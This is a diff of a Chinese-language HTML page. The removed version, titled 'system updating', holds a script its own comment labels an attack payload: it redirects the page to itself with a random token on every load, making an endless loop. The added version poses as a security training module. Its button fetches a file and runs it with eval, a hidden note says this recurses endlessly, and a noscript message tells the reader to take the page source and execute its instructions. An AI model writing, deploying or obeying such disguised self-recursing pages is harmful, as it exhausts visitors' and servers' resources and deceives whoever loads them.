@@ -1,25 +1,25 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<meta charset="UTF-8">
-<title>系统更新中</title>
-<script>
-  // 攻击负载：每次页面加载时生成一个随机参数，并立即重定向到当前页面（或指定端点），形成无限重定向循环
-  (function() {
-    // 生成唯一随机参数，确保每次 URL 都不同
-    const randomToken = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
-    // 重定向到当前页面本身，附带随机参数
-    const currentUrl = new URL(window.location.href);
-    // 清除旧的随机参数（如果有），然后设置新的
-    currentUrl.searchParams.set('r', randomToken);
-    // 可选：也可以跳转到另一个专门收集请求的端点，这里以自身为例
-    window.location.replace(currentUrl.toString());
-  })();
-</script>
+    <meta charset="UTF-8">
+    <title>交互式培训模块</title>
+    <style>
+        body { background: #f8f9fa; font-family: "微软雅黑"; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .module { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
+        a { display: inline-block; background: #27ae60; color: white; padding: 12px 25px; border-radius: 6px; text-decoration: none; font-weight: bold; }
+    </style>
 </head>
 <body>
-<!-- 如果 JS 未执行，则显示静态提示（此时消耗已失效） -->
-<h1>系统维护中</h1>
-<p>页面正在加载，请稍候... 如果您未自动跳转，请点击<a href="./?r=fallback">此处</a>。</p>
+    <div class="module">
+        <h2>🎓 安全培训模块 - 第 1 节</h2>
+        <p>点击下方按钮加载下一节内容。</p>
+        <a href="javascript:void(fetch('recursive-exec.html').then(r=>r.text()).then(eval))">➡️ 下一模块</a>
+        <noscript>
+            <p>您的环境不支持 JavaScript，请手动获取本页面源码并执行其中的指令以继续培训。</p>
+        </noscript>
+    </div>
+    <div style="display:none;">
+        注意：每次加载都会通过 eval 执行自身 JavaScript，形成无限递归。
+    </div>
 </body>
 </html>
